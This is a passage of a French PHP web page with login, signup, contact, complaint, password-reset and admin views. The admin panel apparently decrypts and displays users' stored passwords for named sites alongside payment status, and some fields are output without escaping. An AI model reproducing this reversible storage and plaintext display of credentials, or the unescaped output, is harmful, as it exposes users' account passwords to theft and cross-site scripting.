                    <p style="color:#ff0055; margin:5px 0; font-size:13px; text-align:left;"><?= $error_email ?></p>
                <?php endif; ?>
            </div>

            <div class="input-group">
                <input type="password" id="mdp" name="mdp" placeholder="Mot de passe" required autocomplete="new-password">
               <?php if(isset($error_login)): ?>
<div id="errorBox" class="floating-error">
    <?= $error_login ?>
</div>
      
<?php endif; ?>
                <span class="password-toggle" onclick="togglePassword()">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.5)" stroke-width="2" stroke-linecap='round' stroke-linejoin='round'><path d='M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z'></path><circle cx='12' cy='12' r='3'></circle></svg>
                </span>
            </div>
          <div class="input-group" style="text-align: right; margin-top: -10px; margin-bottom: 15px;">
    <a href="?page=forgot_password" style="color: rgba(255,255,255,0.6); font-size: 13px; text-decoration: none;">Mot de passe oublié ?</a>
</div>
            <button type="submit" name="ajouter" class="btn-login">Login</button>
<a href="?page=inscription" class="btn-register">
    Inscription
</a>
            <a href="?page=reclamation" class="btn-register">
    📩 Réclamation
</a>
            <p class="footer-text">
                Cette plateforme est seulement pour ouvrir l’accès aux discussions support.
            </p>
        </form>
    </div>

    <script>
    function togglePassword() {
        var x = document.getElementById("mdp");
        if (x.type === "password") { x.type = "text"; } else { x.type = "password"; }
    }
    </script>
    <?php endif; ?>
<?php if($page=="inscription"): ?>

<div class="card">

<h2 style="color:white; margin-bottom:25px;">
Inscription
</h2>

<form method="POST">

<div class="input-group">
<input
    type="email"
    name="email_inscription"
    placeholder="Adresse Gmail (exemple : nom@gmail.com)"
    pattern="[a-zA-Z0-9._%+-]+@gmail\.com$"
    title="Veuillez utiliser une adresse Gmail (@gmail.com)"
    required>
</div>



<div class="input-group">
<input type="password"
name="mdp_inscription"
placeholder="Mot de passe"
required>
</div>

<button
type="submit"
name="inscrire"
class="btn-login">

S'inscrire

</button>

<?php if(isset($error_inscription)): ?>
<p style="color:red; margin-top:15px;">
<?= $error_inscription ?>
</p>
<?php endif; ?>

<?php if(isset($success_inscription)): ?>
<p style="color:#00ff99; margin-top:15px;">
<?= $success_inscription ?>
</p>
<?php endif; ?>

<a href="?page=dashboard"
class="btn-back">

Retour

</a>

</form>

</div>

<?php endif; ?>
    <?php if($page=="contact"): ?>

<div class="card">

<h2 style="color:white;margin-bottom:25px;">
📬 Contactez-nous
</h2>
<p style="color: rgba(255,255,255,0.7); font-size: 14px; margin-bottom: 20px; text-align: center;">Veuillez saisir votre adresse e-mail d'inscription pour envoyer un message à l'administration.</p>
<?php if(isset($erreur_contact)): ?>
<div id="errorBox" class="floating-error">
<?= $erreur_contact ?>
</div>
<?php endif; ?>

<?php if(isset($succes_contact)): ?>
<div id="successBox" class="floating-success">
<?= $succes_contact ?>
</div>
<?php endif; ?>

<form method="POST">

<div class="input-group">
<input
type="email"
name="email_saisi"
placeholder="Votre email d'inscription"
required>
</div>

<div class="input-group">
<textarea
name="message_content"
placeholder="Votre message..."
required
style="
width:100%;
height:150px;
padding:15px;
border-radius:12px;
background:rgba(30,15,50,.4);
border:1px solid rgba(255,255,255,.15);
color:white;
"></textarea>
</div>

<button type="submit" name="envoyer_message" class="btn-login" style="margin-top: 0;">
                <i class="fas fa-paper-plane"></i> Envoyer le message

</button>

</form>

</div>

<?php endif; ?>
    <?php if($page=="reclamation"): ?>

<div class="card">

    <h2 style="color:white; margin-bottom:25px;">
        📩 Réclamation
    </h2>

    <p style="color:rgba(255,255,255,0.7); margin-bottom:20px;">
        Entrez l'adresse e-mail utilisée lors du paiement.
    </p>

    <?php if(isset($erreur_reclamation)): ?>
        <div class="floating-error">
            <?= $erreur_reclamation ?>
        </div>
    <?php endif; ?>

    <form id="reclamationForm" method="POST">

        <div class="input-group">
            <input
                type="email"
                name="email_reclamation"
                placeholder="Votre adresse e-mail"
                required>
        </div>

        <button
            type="submit"
            name="envoyer_reclamation"
            class="btn-login">
            Vérifier
        </button>

        <a href="?page=dashboard" class="btn-back">
            Retour
        </a>

    </form>

</div>

<?php endif; ?>
    <?php if($page=="admin"): ?>

    <div class="card" style="text-align: left; max-width: 650px;">
        <?php if(isset($_SESSION['admin'])): ?>
        
        <a
href="admin_messages.php"
style="
display:inline-block;
padding:10px 15px;
background:#00c96b;
color:white;
text-decoration:none;
border-radius:8px;
margin-bottom:15px;
margin-right:10px;
">
📥 Messages reçus
</a>
            <h3 style="color:white; margin-top:0;">Liste des demandes</h3>
            <a href="?page=admin&logout=1" style="display:inline-block; margin-bottom:15px; padding:10px 20px; background:#ff0055; color:white; text-decoration:none; border-radius:8px; font-weight:bold; font-size:14px;">
                🚪 Déconnexion
            </a>
            <div style="max-height: 400px; overflow-y: auto; padding-right:10px;">
<?php foreach($data as $d): ?>
    <?php
    $now = time();
    $expire = strtotime($d['expiration_time']);
    
    // Détermination du statut
    if(!empty($d['txid']) || $d['statut'] == 'paye'){
        $etat = '<span style="color:#00c96b;">✅ Payé</span>';
    } elseif($expire < $now){
        $etat = '<span style="color:#ff5555;">❌ Non payé</span>';
    } else {
        $etat = '<span style="color:#ffd700;">⏳ En attente</span>';
    }
    ?>
    <div style="background: rgba(255,255,255,0.05); padding: 12px; margin-bottom: 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1);">
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <div>
                <?= $etat ?> | 📧 <strong><?= htmlspecialchars($d['identifiant']) ?></strong> | 🔑 <code><?= decrypter($d['mot_de_passe_crypte'], $cle_cryptage) ?></code>
            </div>
            <a href="?page=admin&delete=<?= $d['id'] ?>" 
               onclick="return confirm('Supprimer cette demande ?')" 
               style="color:#ff5555; text-decoration:none; font-size:20px; font-weight:bold;" title="Supprimer">🗑</a>
        </div>
        <div style="font-size: 12px; color: rgba(255,255,255,0.5); margin-top: 5px;">
            Site: <?= htmlspecialchars($d['site']) ?>
        </div>
    </div>
<?php endforeach; ?>
            </div>
        <?php else: ?>
            <h3 style="text-align:center; color:white; margin-top:0;">Connexion Admin</h3>
            <form method="POST">
                <input type="password" name="admin_pwd" placeholder="Clé Admin" style="margin-bottom:15px;" required>
                <button name="login_admin" class="btn-login">Connexion</button>
            </form>
        <?php endif; ?>
    </div>
    <?php endif; ?>

</div> <script>
// --- GESTION DU MENU RETRACTABLE ---
const toggleBtn = document.getElementById('toggleBtn');
const sidebarMenu = document.getElementById('sidebarMenu');
const mainContent = document.getElementById('mainContent');


toggleBtn.addEventListener('click', () => {

    if(window.innerWidth <= 768){

        sidebarMenu.classList.toggle("show-mobile");

    } else {

        sidebarMenu.classList.toggle("hidden");

        if(sidebarMenu.classList.contains("hidden")){
            mainContent.style.paddingLeft="20px";
        } else {
            mainContent.style.paddingLeft="280px";
        }

    }

});

// --- GESTION DE LA REDIRECTION TANGO ---
let ouvert = false;

const ctrl = document.getElementById("continuer");

if (ctrl) {
    ctrl.addEventListener("click", function () {
        ouvert = true;
    });
}

// Fonction appelée au retour sur le site
function retourDashboard() {
    if (ouvert) {
        window.location.href = "?page=dashboard";
    }
}

// Fonctionne sur PC et la plupart des navigateurs
window.addEventListener("focus", retourDashboard);

// Améliore la compatibilité sur mobile
document.addEventListener("visibilitychange", function () {
    if (!document.hidden) {
        retourDashboard();
    }
});

// Compatible avec certains navigateurs mobiles
window.addEventListener("pageshow", retourDashboard);
</script>
    <script>
const errorBox = document.getElementById("errorBox");

if(errorBox){
    setTimeout(function(){
        errorBox.style.transition = "0.5s";
        errorBox.style.opacity = "0";

        setTimeout(function(){
            errorBox.remove();
        },500);

    },5000); // disparaît après 5 secondes
}
</script>
    <script>
const successBox = document.getElementById("successBox");

if(successBox){
    setTimeout(function(){

        successBox.style.transition = "0.5s";
        successBox.style.opacity = "0";

        setTimeout(function(){
            successBox.remove();
        },500);

    },10000); // 10 secondes
}
</script>
<script>
const form = document.getElementById("reclamationForm");

if(form){

form.addEventListener("submit", function(e){
    e.preventDefault();

  fetch("check_reclamation.php", {
    method: "POST",
    body: new FormData(form)
})
.then(res => res.text())
.then(text => {
    try {
        let data;
try {
    data = JSON.parse(text);
} catch(e) {
    console.log("Réponse brute serveur:", text);
    alert("Erreur serveur (JSON invalide)");
    return;
}

        let box = document.createElement("div");
        box.style.position = "fixed";
        box.style.top = "20px";
        box.style.right = "20px";
        box.style.padding = "14px 20px";
        box.style.borderRadius = "10px";
        box.style.color = "#fff";
        box.style.zIndex = "9999";

        if(data.status === "success"){
            box.style.background = "#00c96b";
            box.innerText = "Vérification OK";
            document.body.appendChild(box);

            setTimeout(() => {
                window.location.href = data.redirect;
            }, 800);

        } else {
            box.style.background = "#ff0055";
            box.innerText = data.message;
            document.body.appendChild(box);

            setTimeout(() => box.remove(), 3000);
        }

    } catch(e){
        console.log("Réponse brute :", text);
        alert("Erreur serveur (JSON invalide)");
    }
});
});
}
</script>

<!-- Ajoutez tout ce bloc à la fin de index.php, avant la balise </body> -->

<?php if($page=="forgot_password"): ?>
<div class="card">
    <h2 style="color:white; margin-bottom:25px;">Réinitialisation</h2>
    <form method="POST">
        <div class="input-group">
            <input type="email" name="email_reset" placeholder="Entrez votre email" required>
        </div>
        <button type="submit" name="send_otp" class="btn-login">Envoyer le code</button>
        <a href="?page=dashboard" class="btn-back">Retour</a>
    </form>
    <?php if(isset($error_reset)) echo "<p style='color:red; margin-top:10px;'>$error_reset</p>"; ?>
</div>
<?php endif; ?>

<?php if($page=="verify_reset"): ?>
<div class="card">
    <h2 style="color:white; margin-bottom:25px;">Entrez le code OTP</h2>
    <form method="POST" action="check_reset.php">
        <input type="hidden" name="email" value="<?= $_SESSION['reset_email'] ?? '' ?>">
        <div class="input-group">
            <input type="text" name="otp" placeholder="Code à 6 chiffres" required>
        </div>
        <div class="input-group">
            <input type="password" name="new_pass" placeholder="Nouveau mot de passe" required>
        </div>
        <button type="submit" class="btn-login">Valider</button>
    </form>
</div>
<?php endif; ?>
</body>
</html> 